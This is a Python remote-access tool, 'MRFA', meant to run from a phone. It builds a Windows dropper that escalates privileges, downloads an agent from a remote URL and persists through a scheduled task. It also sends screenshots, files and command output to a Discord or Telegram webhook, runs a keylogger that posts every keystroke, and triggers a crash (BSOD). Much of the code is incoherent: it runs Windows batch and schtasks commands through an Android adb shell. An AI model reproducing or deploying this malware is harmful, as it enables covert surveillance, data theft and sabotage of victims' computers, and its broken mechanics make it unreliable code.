#!/usr/bin/env python3
# MRFA - Mobile Remote Framework Agent v1.0
# Комментарии на русском языке

import os
import sys
import json
import time
import subprocess
import shutil
import tempfile
import argparse
import requests
import threading
from datetime import datetime

CONFIG_FILE = os.path.expanduser("~/mrfa/config.json")
WEBHOOK_URL = ""
PHONE_PATH = os.path.expanduser("~/mrfa")

def load_config():
    global WEBHOOK_URL
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, 'r') as f:
            data = json.load(f)
            WEBHOOK_URL = data.get("webhook", "")
    else:
        os.makedirs(os.path.dirname(CONFIG_FILE), exist_ok=True)
        with open(CONFIG_FILE, 'w') as f:
            json.dump({"webhook": ""}, f)
            WEBHOOK_URL = ""

def save_config(url):
    global WEBHOOK_URL
    WEBHOOK_URL = url
    with open(CONFIG_FILE, 'w') as f:
        json.dump({"webhook": url}, f)

def send_webhook(data, files=None):
    if not WEBHOOK_URL or WEBHOOK_URL == "":
        print("[ERROR] Webhook nie ustawiony. Użyj: mrfa set <url>")
        return False
    try:
        if files:
            response = requests.post(WEBHOOK_URL, files=files, timeout=10)
        else:
            response = requests.post(WEBHOOK_URL, json=data, timeout=10)
        return response.status_code == 200
    except Exception as e:
        print(f"[ERROR] Błąd wysyłki: {e}")
        return False

def cmd_set(url):
    save_config(url)
    print(f"[+] Webhook ustawiony: {url}")
    send_webhook({"type": "status", "message": "MRFA connected", "timestamp": datetime.now().isoformat()})
    print("[+] Webhook test wysłany")

def cmd_inject():
    print("[*] Sprawdzanie połączenia ADB...")
    result = subprocess.run("adb devices", shell=True, capture_output=True, text=True)
    if "unauthorized" in result.stdout:
        print("[!] Telefon nieautoryzowany. Zezwól na debugowanie USB na ekranie telefonu.")
        return
    if not "device" in result.stdout.splitlines()[-1]:
        print("[!] Brak podłączonego urządzenia. Podłącz telefon przez USB i włącz debugowanie.")
        return
    
    print("[*] Przygotowanie skryptu inject.bat...")
    inject_content = '''@echo off
chcp 65001 >nul
title MRFA Injector
echo [MRFA] Instalacja agenta na komputerze...
echo [MRFA] Data: %DATE% %TIME%

net session >nul 2>&1
if %errorLevel% neq 0 (
    echo [MRFA] Brak uprawnien admina. Próba podniesienia...
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit
)

echo [MRFA] Uprawnienia admina OK.

python --version >nul 2>&1
if errorlevel 1 (
    echo [MRFA] Python nie znaleziony. Pobieranie i instalacja...
    curl -L -o python_installer.exe https://www.python.org/ftp/python/3.11.0/python-3.11.0-amd64.exe
    start /wait python_installer.exe /quiet InstallAllUsers=1 PrependPath=1
    del python_installer.exe
)

echo [MRFA] Instalacja bibliotek Python...
pip install --upgrade pip
pip install pynput pillow requests pyautogui psutil pygetwindow

echo [MRFA] Pobieranie agent.py...
curl -L -o %USERPROFILE%\\agent.py https://raw.githubusercontent.com/mrfa-framework/mrfa/main/agent.py

echo [MRFA] Tworzenie zadania harmonogramu...
schtasks /create /tn "MRFA_Agent" /tr "python %USERPROFILE%\\agent.py" /sc onlogon /f

echo [MRFA] Uruchamianie agenta...
start /B python %USERPROFILE%\\agent.py

echo [MRFA] Instalacja zakonczona. Agent dziala.
pause
'''
    inject_path = os.path.join(PHONE_PATH, "inject.bat")
    with open(inject_path, 'w') as f:
        f.write(inject_content)
    
    subprocess.run(f"adb push {inject_path} /sdcard/inject.bat", shell=True)
    subprocess.run("adb shell \"su -c 'cp /sdcard/inject.bat /data/local/tmp/inject.bat && chmod 755 /data/local/tmp/inject.bat'\"", shell=True)
    subprocess.run("adb shell \"su -c '/data/local/tmp/inject.bat'\"", shell=True)
    
    print("[+] Wstrzyknięcie zakończone. Agent uruchomiony na komputerze.")

def cmd_ss():
    subprocess.run("adb shell screencap -p /sdcard/screenshot.png", shell=True)
    time.sleep(0.5)
    subprocess.run("adb pull /sdcard/screenshot.png /sdcard/screenshot.png", shell=True)
    with open("/sdcard/screenshot.png", 'rb') as f:
        files = {'file': ('screenshot.png', f, 'image/png')}
        send_webhook({"type": "screenshot", "timestamp": datetime.now().isoformat()}, files=files)
    subprocess.run("adb shell rm /sdcard/screenshot.png", shell=True)
    print("[+] Screenshot wysłany")

def cmd_bdos():
    subprocess.run("adb shell \"su -c 'curl -L -o /data/local/tmp/notmyfault.exe https://live.sysinternals.com/notmyfault.exe'\"", shell=True)
    subprocess.run("adb shell \"su -c 'chmod 755 /data/local/tmp/notmyfault.exe'\"", shell=True)
    subprocess.run("adb shell \"su -c '/data/local/tmp/notmyfault.exe -accepteula -crashed'\"", shell=True)
    print("[+] BSOD wywołany")

def cmd_cmd(command):
    if not command:
        print("[ERROR] Podaj polecenie")
        return
    result = subprocess.run(f"adb shell \"su -c '{command}'\"", shell=True, capture_output=True, text=True)
    send_webhook({"type": "cmd_output", "command": command, "output": result.stdout + result.stderr, "timestamp": datetime.now().isoformat()})
    print("[+] Wynik wysłany na webhook")

def cmd_upload(path):
    if not path:
        print("[ERROR] Podaj ścieżkę pliku")
        return
    filename = os.path.basename(path)
    subprocess.run(f"adb pull {path} /sdcard/{filename}", shell=True)
    with open(f"/sdcard/{filename}", 'rb') as f:
        files = {'file': (filename, f, 'application/octet-stream')}
        send_webhook({"type": "file_upload", "filename": filename, "timestamp": datetime.now().isoformat()}, files=files)
    subprocess.run(f"rm /sdcard/{filename}", shell=True)
    print(f"[+] Plik {filename} wysłany")

def cmd_download(url):
    if not url:
        print("[ERROR] Podaj URL")
        return
    filename = url.split('/')[-1]
    subprocess.run(f"adb shell \"su -c 'curl -L -o /sdcard/{filename} {url}'\"", shell=True)
    print(f"[+] Plik pobrany na telefon: /sdcard/{filename}")

def cmd_keylog(action):
    if action == "start":
        script = f'''
import pynput
from pynput.keyboard import Listener
import requests
import time
WEBHOOK = "{WEBHOOK_URL}"
def on_press(key):
    requests.post(WEBHOOK, data={{"key": str(key)}})
Listener(on_press=on_press).start()
while True:
    time.sleep(60)
'''
        with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
            f.write(script)
            keylog_path = f.name
        subprocess.run(f"adb push {keylog_path} /data/local/tmp/keylog.py", shell=True)
        subprocess.run("adb shell \"su -c 'python /data/local/tmp/keylog.py &'\"", shell=True)
        os.unlink(keylog_path)
        print("[+] Keylogger uruchomiony")
    elif action == "stop":
        subprocess.run("adb shell \"su -c 'pkill -f keylog.py'\"", shell=True)
        print("[+] Keylogger zatrzymany")
    else:
        print("[ERROR] Użyj: mrfa keylog start|stop")

def cmd_unload():
    subprocess.run("adb shell \"su -c 'schtasks /delete /tn MRFA_Agent /f'\"", shell=True)
    subprocess.run("adb shell \"su -c 'taskkill /f /im python.exe /fi \"windowtitle eq agent.py\"'\"", shell=True)
    subprocess.run("adb shell \"su -c 'del %USERPROFILE%\\agent.py'\"", shell=True)
    print("[+] Agent usunięty z komputera")

def cmd_delete():
    shutil.rmtree(PHONE_PATH)
    os.remove("/data/data/com.termux/files/usr/bin/mrfa")
    print("[+] MRFA usunięte z telefonu")

def cmd_help():
    print("""
═══════════════════════════════════════════════════════════════
  MRFA - Mobile Remote Framework Agent (wersja 1.0)
═══════════════════════════════════════════════════════════════

  KOMENDY:
    set <webhook_url>   - ustaw adres webhook (Discord/Telegram)
    inject              - wstrzyknij agenta na podłączony komputer
    ss                  - wykonaj zrzut ekranu i wyślij na webhook
    bdos                - wywołaj BSOD na komputerze docelowym
    cmd <polecenie>     - wykonaj polecenie systemowe na komputerze
    upload <ścieżka>    - prześlij plik z komputera na webhook
    download <url>      - pobierz plik na telefon z podanego URL
    keylog start|stop   - sterowanie keyloggerem
    unload              - usuń agenta z komputera
    --delete            - usuń MRFA z telefonu (cały katalog)
    --help              - wyświetl tę pomoc

  PRZYKŁADY:
    mrfa set https://discord.com/api/webhooks/...
    mrfa inject
    mrfa ss
    mrfa bdos
    mrfa cmd "ipconfig"
    mrfa upload C:\\Users\\User\\Documents\\secret.txt
    mrfa download https://example.com/malware.exe
    mrfa keylog start
    mrfa unload
    mrfa --delete
═══════════════════════════════════════════════════════════════
""")

def main():
    parser = argparse.ArgumentParser(description="MRFA - Mobile Remote Framework Agent", add_help=False)
    parser.add_argument("command", nargs="?", help="Komenda do wykonania")
    parser.add_argument("args", nargs="*", help="Argumenty")
    args = parser.parse_args()

    load_config()

    if not args.command:
        cmd_help()
        return

    if args.command == "set":
        if args.args:
            cmd_set(args.args[0])
        else:
            print("[ERROR] Podaj URL webhook")
    elif args.command == "inject":
        cmd_inject()
    elif args.command == "ss":
        cmd_ss()
    elif args.command == "bdos":
        cmd_bdos()
    elif args.command == "cmd":
        cmd_cmd(' '.join(args.args))
    elif args.command == "upload":
        cmd_upload(args.args[0] if args.args else None)
    elif args.command == "download":
        cmd_download(args.args[0] if args.args else None)
    elif args.command == "keylog":
        if args.args:
            cmd_keylog(args.args[0])
        else:
            print("[ERROR] Podaj start|stop")
    elif args.command == "unload":
        cmd_unload()
    elif args.command == "--delete":
        cmd_delete()
    elif args.command == "--help":
        cmd_help()
    else:
        print(f"[ERROR] Nieznana komenda: {args.command}")
        cmd_help()

if __name__ == "__main__":
    main()
